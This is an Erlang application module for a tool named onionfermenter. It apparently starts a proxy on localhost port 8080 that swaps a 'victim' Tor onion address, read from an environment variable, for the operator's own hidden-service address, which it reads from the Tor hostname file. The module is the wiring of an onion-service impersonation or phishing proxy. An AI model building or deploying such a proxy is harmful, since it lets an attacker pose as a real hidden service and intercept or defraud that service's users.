%%%-------------------------------------------------------------------
%% @doc onionfermenter public API
%% @end
%%%-------------------------------------------------------------------

-module(onionfermenter_app).

-behaviour(application).

-export([start/2, stop/1]).

start(_StartType, _StartArgs) ->
    onionfermenter_sup_sup:start_link(),

    % Get victim onion id from env
    VictimOnionId = os:getenv("VICTIM_ONION_ID"),

    % get own onion id from tor hostname file
    {ok, S} = file:open("/var/lib/tor/hidden_service/hostname", read),
    FullLine = io:get_line(S, ''),
    file:close(S),
    OwnOnionId = lists:nth(1,string:split(FullLine, ".onion")),

    Replace = { VictimOnionId, OwnOnionId},

    onionfermenter_sup_sup:add_onionfermenter(name_which_does_not_matter, 8080, localhost, Replace, 8081). % add the single OF here on start

stop(_State) ->
    ok.

%% internal functions
